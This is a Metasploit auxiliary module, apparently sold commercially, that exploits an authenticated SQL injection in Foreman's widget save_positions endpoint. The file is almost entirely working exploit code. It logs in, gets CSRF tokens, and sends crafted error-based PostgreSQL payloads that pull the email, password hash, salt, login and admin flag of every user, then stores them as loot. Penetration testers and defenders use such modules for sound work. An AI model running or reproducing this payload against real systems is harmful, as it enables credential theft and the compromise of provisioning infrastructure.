##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Foreman Dashboard Widget Authenticated SQL Injection',
      'Description'    => %q{
    This module exploits an authenticated SQL injection in Foreman, an open-source provisioning application.

    Foreman is a popular open-source enterprise solution for managing and provisioning assets on a network.
    Versions 1.9 through 1.16.0 were vulnerable to an authenticated SQL injection. This module exploits
    the vulnerability in order to retrieve the usernames, password hashes, and other information from the database.
    Tested against 1.16.0.

    Categories: Open Source, Enterprise

    Price: 6

    Video: https://asciinema.org/a/MkVVLA0tVDLJRSWJYMn7nwRPC

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => '',
      'DefaultOptions' => {
        'SSL' => true,
      }
    ))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptString.new("USERNAME", [true, 'The username to authenticate with', 'admin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'password'])
      ], self.class)
  end

  def check
    left = Rex::Text.rand_text_alpha(5)
    right = Rex::Text.rand_text_alpha(5)
    flag = Rex::Text.rand_text_alpha(5)

    res = login

    res = make_injected_request(") AND 6435=CAST((#{str2chr(left)})||(#{str2chr(flag)})||(#{str2chr(right)}) AS NUMERIC)-- nCik", res.get_cookies)

    if res.body =~ /#{left}#{flag}#{right}/
      return Msf::Exploit::CheckCode::Vulnerable
    else
      return Msf::Exploit::CheckCode::Safe
    end
  end

  def run
    res = login
    cookies = res.get_cookies
    left = Rex::Text.rand_text_alpha(5)
    right = Rex::Text.rand_text_alpha(5)

    res = make_injected_request(") AND 7949=CAST((#{str2chr(left)})||(SELECT COALESCE(CAST(COUNT(*) AS CHARACTER(10000)),(CHR(32))) FROM users)::text||(#{str2chr(right)}) AS NUMERIC)-- YROQ", cookies)

    user_count = $1.to_i if res.body =~ /#{left}(.*?)#{right}/

    users = []
    0.upto(user_count-1) do |i|
      res = make_injected_request(") AND 8137=CAST((#{str2chr(left)})||(SELECT COALESCE(CAST(mail AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(left)})||(SELECT COALESCE(CAST(password_hash AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(left)})||(SELECT COALESCE(CAST(password_salt AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(left)})||(SELECT COALESCE(CAST(login AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(left)})||(SELECT COALESCE(CAST(admin AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(left)})||(SELECT COALESCE(CAST(id AS CHARACTER(10000)),(CHR(32))) FROM users ORDER BY id OFFSET #{i} LIMIT 1)::text||(#{str2chr(right)}) AS NUMERIC)-- lsuo", cookies)

      vals = res.body.scan(/#{left}(.*?)#{left}(.*?)#{left}(.*?)#{left}(.*?)#{left}(.*?)#{left}(.*?)#{right}/)
      users << {
        'email' => vals[0][0],
        'hash' => vals[0][1],
        'salt' => vals[0][2],
        'login' => vals[0][3],
        'admin' => vals[0][4],
        'id' => vals[0][5]
      }
    end

    p = store_loot('foreman.users', "application/javascript", datastore['RHOST'], users.to_json, "#{datastore['RHOST']}_wordpress_foreman.txt", "Foreman Users", 'User details for Foreman')

    print_good("Users stored in file: #{p}")
  end

  def str2chr(str)
    chr = "CHR("+str[0].ord.to_s+")"

    1.upto(str.length-1) do |c|
      chr << "||CHR("+str[c].ord.to_s+")"
    end

    return chr
  end

  def login
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'users', 'login')
    })

    csrf = $1 if res && res.body =~ /<input type="hidden" name="authenticity_token" value="(.*?)" \/>/

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'users', 'login'),
      'method' => 'POST',
      'vars_post' => {
        'utf8' => "\xE2\x9C\x93",
        'authenticity_token' => csrf,
        'login[login]' => datastore['USERNAME'],
        'login[password]' => datastore['PASSWORD'],
        'commit' => 'Log In'
      },
      'cookie' => res.get_cookies
    })
  end

  def make_injected_request(sqli, cookie)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'hosts'),
      'cookie' => cookie
    })

    csrf = $1 if res.body =~ /<meta name="csrf-token" content="(.*?)" \/>/

    unless csrf
      fail_with(Failure::Unknown, 'Unable to retrieve CSRF token')
    end

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'widgets', 'save_positions'),
      'method' => 'POST',
      'vars_post' => {
        'widgets[1'+sqli+'][col]' => 1
      },
      'cookie' => cookie,
      'headers' => {
        'X-CSRF-TOKEN' => csrf
      }
    })
  end
end

